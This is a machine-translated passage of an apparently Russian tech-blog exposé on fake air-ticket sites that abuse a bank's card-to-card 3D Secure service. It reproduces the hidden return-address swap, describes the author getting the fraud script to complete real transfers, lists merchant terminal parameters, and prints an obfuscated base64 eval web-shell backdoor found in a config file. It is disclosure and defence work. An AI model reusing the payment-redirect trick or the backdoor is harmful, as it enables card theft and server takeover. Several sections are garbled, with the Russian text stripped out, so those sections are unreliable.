class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"TermUrl"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">type</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"hidden"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"http://p2p.localhost/sus.php?cd=BX3FKT"</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The replaced string is the address of the page on which the issuing bank of the sender card, after verifying the 3D Secure code, must return the user. Before the script replaced the line, Promsvyazbank was specified as the return address. After the script has replaced the string, some page on the fraudulent site is already indicated as the return address.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I do not fully understand at what point the return address is being replaced, but it works. At that moment, when the browser displays the https Sberbank page with a request to enter the 3D Secure code, if the browser looks at the source HTML code for the page, there is no return address on any site. The HTML code of this page is longer than 400 lines and is completely different from the above HTML code of the Sberbank response page, which was captured by writing the variables $ page (line 166) and $ pp (line 174) to disk.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If you enter an incorrect 3D Secure code, Sberbank on its page gives a message stating that the code is incorrect and sends another SMS. As soon as the correct code is entered, it is redirected to the payment site or to a replacement site. That is, it is likely that the redirection itself to the payment site implies that all the necessary procedures have been carried out by Sberbank. Sberbank here serves as an example for testing. Transfer can be made through another bank.</font></font><br><br><img src="https://habrastorage.org/files/67f/61d/011/67f61d0110d6481ca5115d314953530c.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">From the ‚Äúticket buyer‚Äù it looks like this. The buyer on the pre-prepared form of payment enters the number of your card. After that, the 3D Secure code confirmation page is displayed almost immediately and an SMS with a confirmation code arrives. The 3D Secure page in the browser is displayed on the website of the issuer's bank card issuer via the HTTPS protocol. The page with the form for entering the card number may look suspicious, but the confirmation of 3D Secure on the website of your bank does not raise any doubts or suspicions. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">By the way, pay attention to the signature ‚Äúticket pay‚Äù in the ‚ÄúDescription‚Äù line on the 3D Secure page from Sberbank. This signature is set in the payp2p.php script. In future examples, we will try to change it. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Let's go back to testing.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I entered the code from the SMS on the Sberbank page and after clicking on the ‚ÄúSend‚Äù button, I received a warning that the data would be sent over an unprotected connection. </font></font><br><br><img src="https://habrastorage.org/files/f0c/33c/ce6/f0c33cce63e54f30b07837ae52bd52c8.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After I confirmed that I agree with sending data over an unsecured connection, I was redirected to the page /sus.php?cd=‚Ä¶ </font></font><br><br><img src="https://habrastorage.org/files/e86/a82/2f6/e86a822f66024701ade52e4bc3388a38.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">This is a return page. The return address is specified in the script. In this case, the page is not found. But the reason is clear - the return page was not prepared in advance. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Although the goal was almost achieved, the </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">money from card to card was not really passed</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . There were no additional SMS with the information that the payment was declined and so forth.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I decided that the reason for the failure in the first attempt was that the local site (localhost) worked over the unprotected http connection, and the Sberbank site had a secure http protocol. Http and https are not very friendly with each other. This, incidentally, explains why the fraudulent sites described in the first part of the publication used a secure https connection, albeit with the simplest certificate. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">To test this assumption, we had to configure the https protocol on the local site. For this, a local domain p2p.localhost and a self-signed certificate were created. As a result, the new address with the test script began to look like this: </font></font><br><br> <code>https://p2p.localhost/payp2p.php</code> <br> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Additionally, the script changed the address of the page to which the return should take place after entering the 3D Secure code. The page for the return was also pre-prepared.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">We try once again to make a payment with a local site that works using the https protocol. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">When you first connect, the browser naturally swears at an incorrectly configured secure connection. </font><font style="vertical-align: inherit;">This is due to the fact that we have a self-signed certificate. </font></font><br><br><img src="https://habrastorage.org/files/8d1/ff3/73f/8d1ff373f65d4f70af5fa16538e13d5d.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Since the source of the certificate is known, we add it to the exceptions.</font></font><br><br><img src="https://habrastorage.org/files/06a/317/d22/06a317d220884c5b93844dff1929907e.png"><br><br>  Everything.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Now the connection is made via https and when you switch from the Sberbank site, the warnings disappear. </font></font><br><br><img src="https://habrastorage.org/files/df9/2c7/ad5/df92c7ad553e492e9192167abb150826.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After entering the 3D Secure code, the return to the specially prepared page is carried out correctly. </font></font><br><br><img src="https://habrastorage.org/files/0a7/21a/677/0a721a677a9a46e68605c7f03beb4bc4.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Everything works fine except </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">that the money really does not go through</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">As a result, I had to test and search for several days, what could be the reason.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I only had some of the files that are used on one of the fraudulent air ticket sales sites. Among the files that were sent to me, there was a file called payment.php. This is a similar script to the one above. Judging by the code, it was probably created not for deceiving visitors on the ‚Äúcombat site‚Äù, but for testing by the programmer-developer of the possibility of transferring from card to card through the 3ds.payment.ru service. Unlikely, but theoretically in earlier versions of fraudulent sites, it could be used not only for testing. </font></font><br><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I tried to make a payment using an alternative payment.php script and the payment was completed the first time.</font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The only thing that confirmation of successful payment was displayed on the site 3ds.payment.ru. </font><font style="vertical-align: inherit;">I decided that once this script works, then it will be possible to find the reason why the first script in the description (payp2p.php) does not work.</font></font><br><br><img src="https://habrastorage.org/files/113/941/882/1139418821c64ae4a67cdefba3b3fd59.png"><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The full code of the payment.php script under the spoiler</font></font></b> <div class="spoiler_text"><img src="https://habrastorage.org/files/c65/c1f/56d/c65c1f56d0fe4e8c895bfbcd98109349.png"><br>      . <br></div></div><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Description of the differences between payment.php and payp2p.php</font></font></b> <div class="spoiler_text">      .  But there are differences. <br><br>  payp2p.php       POST  .  payment.php     GET    .  ,      ,       : <br><br> <code>https://p2p.localhost/payment.php?card_1=1111&amp;card_2=2222...&amp;cvc=999...&amp;price=30...</code> <br> <br>     ,         ¬´ ¬ª. <br><br> Payment.php    payp2p.php       MySQL.        .       . <br><br> Payment.php      .        ,     .   ,  payp2p.php    ,   ,  payment.php      . TERMINAL=24043210, MERCH_NAME=PSB, MERCHANT=000601224043202, EMAIL=lakhtin%40psbank.ru, TRTYPE=8 (    TRTYPE    .   payp2p.php  ). <br><br>   ‚Äî payment.php         <code>https://3ds.payment.ru/cgi-bin/is_3DS</code> .          <code>{"IS_ACTIVE":"Y"}</code>      ,        (   3D Secure). <br><br>     .      payment.php     .  ,        3ds.payment.ru. <br></div></div><br><blockquote>   ‚Ä¶  ,       Firefox,  ¬´¬ª  payment.php      (¬´Firefox/3.0.3¬ª),  ,          , ,           . ,  3.5 Firefox    2009 ,  4 Firefox     2011,      payp2p.php ,  ¬´Firefox/38.0¬ª,      2016  ‚Äî Firefox 49. </blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Then there were attempts to force the payp2p.php script, which is not working for some reason, to be repaired, based on the working script. Were tried different options. All pieces of code that could somehow influence the work in turn were transferred from the working script to the non-working one. Among other things, there was an attempt of an additional intermediate connection to </font></font><code>https://3ds.payment.ru/cgi-bin/is_3DS</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">; change, enable and disable cURL options, etc. Nothing helped, - the stone flower did not come out. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Later, at the time of testing, it was decided to disable redirection at the final stage in payp2p.php. After this, it became possible to read the error message from Promsvyazbank. The screenshot of the error is below. In the browser after an unsuccessful attempt to make a payment, another page is displayed, but if you press ‚ÄúBack‚Äù one or several times, you can see this page.</font></font><br><br><img src="https://habrastorage.org/files/11f/86c/ecd/11f86cecd02b46828d04419e18f8354b.png"><br><blockquote>  Transfer: <br><br> ,         . <br><br>   : /   (/) <br> ,       ,    /  </blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">There are some restrictions on the number of payments from one card per day on the Promsvzyazbank website, etc. Although I did not exceed the limits on the number of actual payments, it is possible that at some stage payments did not go through, due to the large number of my attempts. (To capture the values ‚Äã‚Äãof variables during debugging, I began the payment process many times, but did not finish it.) I don‚Äôt know the exact cause of this message. Every time you try to pay ORDER_NUM and TIMESTAMP, a new one is used. They should not have influenced the appearance of such an error. Although the card I used to pay for one successful payment went through the alternative payment.php script, it‚Äôs possible the card either the sender or the recipient hit the stop list.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The payp2p.php script was already a little like its original state. I myself began to get confused about what I replaced in it and what did not. Therefore, I returned it to its original form, except for the fact that on the last lines the substitution of redirection to the page of successful payment was disabled. The card numbers of the sender and recipient for subsequent attempts were used new. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Finally, with the help of payp2p.php it was possible to make a successful payment. </font></font><br><br><img src="https://habrastorage.org/files/9cd/606/539/9cd60653958e4dda9fa38ef0e9826092.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Note the caption in the "Description" line. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">After entering the 3D Secure confirmation code, return to Promsvyazbak: </font></font><br><br><img src="https://habrastorage.org/files/fed/cb7/370/fedcb7370bcb4995a20a9a7218c6bdbc.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Received SMS. To the left of the sender's bank. To the right of the recipient bank. </font></font><br><br><img src="https://habrastorage.org/files/463/935/875/46393587535a428384fc62522d5154ff.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sberbank, for some reason, indicated in the SMS time in GMT. Previously, I did not notice this in the messages from this bank.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If the return page substitution is disabled, repeat successful payment using the payp2.php script has happened many times. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I tried to pay with other cards. Each bank issues its 3D Secure form. But essentially it does not change. </font></font><br><br><img src="https://habrastorage.org/files/452/684/b75/452684b75ede43deaca4c3c448d77bf5.png"><br><br><img src="https://habrastorage.org/files/671/19c/d9f/67119cd9f13b4b1b92c43903c4a5a466.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Please note that not all banks in their confirmation form include an ‚Äúadditional description‚Äù. In our example ‚Äúticket pay‚Äù.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">It is not necessary to adapt to the page of each bank. Although the forms are different, the mechanism of work of substitution for them means the same. Any form after payment contains a link with the address of the page to which you want to return. The banks providing the 3D Secure verification forms will most likely not be returned to the ‚Äúleft site‚Äù. Surely, there are some rules and banks from the 3DS verification form should at least return to the same domain from which the request for payment came. (In our case at 3ds.payment.ru). The bank verifying the 3D Secure code, if the ‚Äúpassword‚Äù is correctly entered, indicates the address to which the page should be returned in the html code of the page, but it could no longer check whether the return was sent to this page.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As a result of all the experiments, the payp2p.php script was forced to pay through the transfer service from card to card of Promsvyazbank 3ds.payment.ru. At the same time, we had to disable the substitution of the return address on the last lines of the script. When you enable the substitution of the address of the return page, as was the case in the original script, at present, money really does not pass. The 3D Secure verification page is displayed; SMS with ‚Äúpassword‚Äù is sent; verification form does not skip to the next step when entering the wrong password; after entering the correct ‚Äúpassword‚Äù, a forwarding is made to a fake page, but the money does not pass.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Forgery of return address forgery is a very important part for fraudulent sites. If the ‚Äúairline ticket purchaser‚Äù does not suspect that he has been deceived, then he can pay not one, but several purchases of tickets and thereafter for a long time (days and weeks) not take any active actions to cancel the payment and so on. If the buyer, after ‚Äúpaying for the air tickets‚Äù, receives a confirmation of the transfer from card to card, then he will most likely not make the next payment, he will contact his bank and, possibly, the police much faster. This means that cash flow on fraudulent sites decreases, the probability of cancellation of past payments increases, law enforcement agencies and hosting employees begin to act earlier, and the likelihood of not having time to withdraw the stolen funds to a safe place increases.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">There is no doubt that this script was used on a combat fraud site. I have reason to believe that he worked in the form in which he was provided to me. Currently it works limited (without forwarding).</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Approximately three weeks after the release of the first part of the publication, which mentioned the use of the transfer service from card to card by Promsvyazbank by fraudsters, this bank made some changes in the operation of its service, which I consider important. If earlier when paying through Promsvyazbank's website, the payers received incomprehensible SMS with the text ‚ÄúP2P PSBANK‚Äù, then now they began to receive SMS with the text ‚ÄúCARD2CARD PSBANK.RU‚Äù. Even this, at first glance, a slight change in deciphering the purpose of the payment is enough for some of the potential victims of fraudsters to cancel the payment at the confirmation stage. I think this is not a coincidence, but the changes were made as a result of the publication of the article on GeekTimes.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">It is likely that after the publication of the first part of the article, along with the change of the confirmation text in the SMS, additional adjustments could be made to the algorithms of the transfer service from card to card of Promsvyazbank. </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">I can‚Äôt say 100%, but my opinion is that Promsvyazbank‚Äôs 3ds.payment.ru service hadn‚Äôt likely checked the return of users to its website after successfully entering the 3D Secure code on the websites of banks issuing payer cards. Therefore, payments were made even in the case when fraudulent scripts changed the return page.</font></font></b> <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The bank, which is mentioned many times in this publication, was lucky with free advertising. I think that in reality there are still a sufficient number of such banks. Simply, this is more fortunate that it was chosen first for use on fraudulent sites, and then for analysis in this article. As they say, there are no healthy patients - there are poorly examined. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">When writing this article, the task to create a combat fraudulent script did not stand. The task was to try to understand how it works or worked, in order to understand the reasons for which "air ticket buyers" could deceive, and draw conclusions from this.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">This article poses many questions, but does not give all the answers. </font><font style="vertical-align: inherit;">I am sure that among the readers there will be a sufficient number of advanced users who will be able to more accurately comment on the clinical picture and make a diagnosis. </font><font style="vertical-align: inherit;">For my part, I tried to present the testimony as fully as possible ... </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Part of the publication with the analysis of the payment script was completed. </font><font style="vertical-align: inherit;">Further bonuses for those who could read this far.</font></font><br><hr><br> <b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Where do cheap airfare prices come from on fraudulent sites? </font></font></b> <br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In the previous part of the publication, by indirect signs, it was shown that information on the availability of places and prices is programmatically obtained on some honest website, modified and issued to the user.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sample information on availability and prices on a fraudulent website</font></font></b> <div class="spoiler_text"><img src="https://habrastorage.org/files/7a5/1e4/8a8/7a51e48a8a3d4d8aabb8ea4acdbd053e.jpg"><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Now we have the opportunity to look behind the scenes and see how this is implemented in the program code. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Here is a place in the code of a fraudulent site, in which we see where the pictures and prices of flights on fraudulent sites come from. </font></font><br><br><img src="https://habrastorage.org/files/e65/0c5/25b/e650c525b0424acf861678766f7eb75c.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As expected in this series of fraudulent sites, information about availability is taken on an honest site </font></font><code>www.aviacassa.ru</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Since the number of airlines and flights is large, it is very difficult to download all the pictures and icons in such an issue in advance, links to such pictures are left directly to the original site. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">From the received original price for air tickets, the discount is deducted. As previously shown, the owner of a fraudulent site can arbitrarily set a discount amount. The value of the discount is stored in the file aviacfg.php.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> A more complete piece of code responsible for obtaining information on the availability of places, preparing links to pictures and price changes under the spoiler. </font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Price parser - more complete code</font></font></b> <div class="spoiler_text"><img src="https://habrastorage.org/files/cf0/e74/617/cf0e7461727a4415bf018283c1cdf15c.png"><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Line by line this piece will not be parsed, because it is not the code itself that is important here, but the idea of ‚Äã‚Äãhow and where the real data on air tickets for fraudulent sites come from. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The old parser used another site to get data: </font></font><br><br><img src="https://habrastorage.org/files/e7e/625/9d8/e7e6259d8cc84a1586e61e7005ac6d3f.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Tip for air ticket offices </font></font><code>(www.aviacassa.ru)</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- you need to close the possibility of links to domain files from an external referrer (referring site). </font><font style="vertical-align: inherit;">This possibility can be closed to all, without exception, and you can make exceptions only for trusted partners. </font><font style="vertical-align: inherit;">The NGINX web server, which uses aviacassa, easily allows you to do this. </font><font style="vertical-align: inherit;">The same recommendation for all similar sites that can be used as ‚Äúinformation donors‚Äù.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If fraudulent sites can not directly link to pictures on sites such as a ticket office, this will complicate their lives. The number of logos and images of various airlines is not known in advance. Even if you try to download pictures in advance, you can skip something, and the fraudulent site will look ugly. Such sites will be forced to download all the pictures to themselves locally on the server with each request, or at least to check whether such a picture was downloaded earlier in the ‚Äúcache‚Äù or not. This increases the load on the scam server and makes the page display slower. In addition, the closure of the ability to link directly to the pictures at one time will make all the current fraudulent sites that use the air ticket information inoperative.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Of course, over time, the developers will make the patches. </font><font style="vertical-align: inherit;">But since the fraudulent sites are not managed centrally, and different people and automatic software update is not provided, each owner of a fraudulent site will have to look for an opportunity to upgrade. </font><font style="vertical-align: inherit;">Someone will find the updated code, and someone will not find and the site will stop working. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Also, the air ticket office may include a separate log for such images in which records of all external referrers (referring sites) will be saved. </font><font style="vertical-align: inherit;">And in a few days, this log will contain a list of all active fraudulent sites. </font><font style="vertical-align: inherit;">It is very convenient - instead of trying to find each site separately, you can ask them to enroll in the list (log file).</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">And if there are funny admins in the ticket office, then you can joke ...</font></font></b> <div class="spoiler_text">  - NGINX           ,    ,  ¬´¬ª        ,         URL ,   .     .   ‚Äî   ¬´ ¬ª   ,        -, ,  ,       ,     . </div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Someone might say that the publication of such articles serves as a training tool for fraudsters, and ask the question, why did I post it here? </font></font> I answer.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">If there is any way to steal money, based on the use of vulnerable or insufficiently protected software, about which at least a few people know and their goal is to make money on it, then an attempt to hide such information and pretend that there are no problems, only leads to even worse consequences. </font><font style="vertical-align: inherit;">Fraudsters use these methods even more actively, while the banks are satisfied, because they are regularly paid a commission for services and steal money from them. </font><font style="vertical-align: inherit;">Why should banks change something, if everything is okay? </font><font style="vertical-align: inherit;">Periodically, only some Internet users are deceived and lose money on fraudulent sites. </font><font style="vertical-align: inherit;">But who cares?</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">My opinion is that if some ‚Äútricky‚Äù opportunity to steal money becomes known to a very large number of people, then over time it becomes much more difficult for fraudsters to use it, and organizations that use it become impossible to ignore problems. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The payp2.php script and a number of files used on the recent series of fraudulent air ticket sales sites were sent to me by the </font></font><a href="https://geektimes.ru/users/frozenstorm/" class="user_link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">frozenstorm</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> user </font><font style="vertical-align: inherit;">. Where he took it, I do not know, - direct all questions on this subject to him directly.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">But I can say right away that, as it turned out later, it‚Äôs not hard to find a complete set of source codes for fraudulent websites selling tickets. </font><font style="vertical-align: inherit;">It is sought on request "fake tickets." </font><font style="vertical-align: inherit;">Both main search engines give out links on the first page. </font><font style="vertical-align: inherit;">A complete set of source codes cost only 25-30 tons of rubles before. </font><font style="vertical-align: inherit;">After this topic stopped working, non-working source codes, which, according to the seller ‚Äúeasy to finish,‚Äù began to cost 10tr. </font><font style="vertical-align: inherit;">Recently, judging by the messages on the forums, version 2.0 is allegedly on sale again at a price of 25tr. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Below, under the spoiler, is an example of a free sale of the source code of a fraudulent ticket sale site at one of the forums.</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Screenshot forum. </font><font style="vertical-align: inherit;">(Neat, very long pictures)</font></font></b> <div class="spoiler_text"><img src="https://habrastorage.org/files/7bc/69f/693/7bc69f6935294a76ba54c22e6fc2376f.jpg"><br><div class="spoiler"> <b class="spoiler_title"> .  (2/5)</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/823/4a0/f64/8234a0f641be4ef1a1acfe4fe4c8c7b4.jpg"><br></div></div><br><div class="spoiler"> <b class="spoiler_title"> .  (3/5)</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/147/0d7/d85/1470d7d857c2462c9a8948a64348d13e.jpg"><br></div></div><br><div class="spoiler"> <b class="spoiler_title"> .  (4/5)</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/743/5ad/aef/7435adaef04748b987b38b5cac75590a.jpg"><br></div></div><br><div class="spoiler"> <b class="spoiler_title"> .  (5/5)</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/1a1/519/eb6/1a1519eb638949be87239514e44edec9.jpg"><br></div></div><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The forum, which is shown in the screenshot, is openly selling and buying codes of similar fraudulent sites, credit card data, passport data, personal information from state databases, it is proposed to make fake passports, driver's licenses, etc. </font><font style="vertical-align: inherit;">This is just a short list for example.</font></font> Those.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">with rare exceptions, there is a solid crime. </font><font style="vertical-align: inherit;">At the same time, the forum administration acts as a guarantor between buyers and sellers. </font><font style="vertical-align: inherit;">There are several forums like this. </font><font style="vertical-align: inherit;">All of them work freely for years. </font><font style="vertical-align: inherit;">All of them are perfectly indexed by search engines (Yandex, Google, etc.). </font><font style="vertical-align: inherit;">I do not cite the address of a specific forum. </font><font style="vertical-align: inherit;">They are very easy to find.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Since there is a separate person behind each fraudulent air ticket sales site who bought the source code of the site for an inexpensive one, in each particular case you can find a person in charge and this should be done. Not every admin of this fake site is a super professional whose traces are impossible to find. I am sure that among such administrators there are enough those who inherit and, if they have the appropriate authority, can be calculated. But, in my opinion, instead of trying to deal with each fake site separately, you should pay attention to the sites where the sources of such fake sites are distributed freely.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">In order to deal a crushing blow to fraudulent sites selling fake tickets, you need not so much. If everyone does little by little, this will make life more difficult for fraudsters and may raise the question of the inefficiency of running such a business. We need a little attention from search engines - to prevent such sites from falling into advertisements. Without advertising to break through to such sites in the top of the issue is unrealistic. Also, search engines should exclude from the issue of sites where the purchase and sale of criminal schemes. We need a little attention from banks - to monitor their services related to payment, so that they can not easily use the scammers. Need a little attention from the hosters. We need a bit of attention from payment systems - to begin with, to prevent payments from being made without checking 3D Secure (as shown in the first part of the publication,it is still possible). Need a little attention from law enforcement. Instead of investigating each case of theft of money, it is more effective to act proactively - to deal with the nest, where fraudsters communicate (analyze, for example, the very shadow forums). And of course you need a little attention from potential air ticket buyers themselves.</font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">They say that the repair is impossible to finish, but it can only be stopped. </font><font style="vertical-align: inherit;">With this publication it turns out a similar case. </font><font style="vertical-align: inherit;">Therefore, although it would be possible to write a lot more, I will stop here.</font></font> Thanks for attention.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> I will be glad to your comments. </font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS About Jackie Chan ... You can not read</font></font></b> <div class="spoiler_text">       ,       ,           ,    ,      . <br><br>           ,       , ,   ,     - .      .        . <br><br><div class="spoiler"> <b class="spoiler_title"> </b> <div class="spoiler_text">    fon.png.    ,   ,  .    (merch)    .    . <br><br>            . , -      ,    .    .        . <br><img src="https://habrastorage.org/files/d79/ff7/9c4/d79ff79c458d4bd9ad5c15987f410a8b.png"><br><br>          VISA  Mastercard     (logo_standart_ru.png): <br><br><img src="https://habrastorage.org/files/596/f44/183/596f4418373846908dcede64835821c4.png"><br><br>     .   , . <br></div></div><br><div class="spoiler"> <b class="spoiler_title">       parser.php</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/0a9/dd4/b36/0a9dd4b36e6b45ed9aa6f5584dc2adec.png"><br><br>      . <br></div></div><br><div class="spoiler"> <b class="spoiler_title">  </b> <div class="spoiler_text">     ,   ,   ,    - . ,    -,      ¬´¬ª .  (config.php)     ,  .                .     .     .          . <br><br><img src="https://habrastorage.org/files/65d/4e6/484/65d4e6484eca40468fdab34568130804.png"><br><br><pre> <code class="php hljs"><span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>, <span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>,</code> </pre></div></div><br><div class="spoiler"> <b class="spoiler_title"> .       </b> <div class="spoiler_text"><img src="https://habrastorage.org/files/d28/976/6b8/d289766b88b640119c267f7721f8be25.png"><br><br>      ,      ,  ,  ¬´¬ª      . <br></div></div><br><div class="spoiler"> <b class="spoiler_title">     email  </b> <div class="spoiler_text">      ,  EMAIL.  : <br><br><img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"><br>        3ds.payment.ru       <code>Lakhtin@psbank.ru</code> . <br><br>  ,      ? ,    - . , ,     Mastercard     3DS. <br><br> <code>https://www.mastercard.us/content/dam/mccom/en-us/documents/SecureCode%20Vendor%20list/3ds-vendor-list-042215.pdf</code> <br> <br><div class="spoiler"> <b class="spoiler_title">         Mastercard</b> <div class="spoiler_text"><img src="https://habrastorage.org/files/568/5a5/70f/5685a570faf943c191ab61e9927b5e17.png"><br></div></div><br>  email            .      -      .      -         .  Those.  - ,      ,     ,      - . <br><br>   ,   email      ?     . ,  -,        .          ,     .            .     ,           ,   -   -   ,     ,      . <br><br>           . , - -   email    .  ,   ,              .   ,       .   ,    ,        ,           .       -  , ,   ,  email  -,    -           . (,       ,    ..     ).      ,     .. .     .  ,          -,      .  ,       ,      ,      ,    .          .     ,     -, ,           .         , ,   ,     ,     . <br><br>        ?         ,     .  email  , , .     .   -  ,     -   ,        . </div></div><br><div class="spoiler"> <b class="spoiler_title">   ?</b> <div class="spoiler_text">     ,     , ¬´¬ª   3ds.payment.ru,    .    ,          LaravelRUS    ,      Curl   3ds.payment.ru. <br><br>      ,      .       ?   ?  ? <br>  ,          ,     . <br><br><img 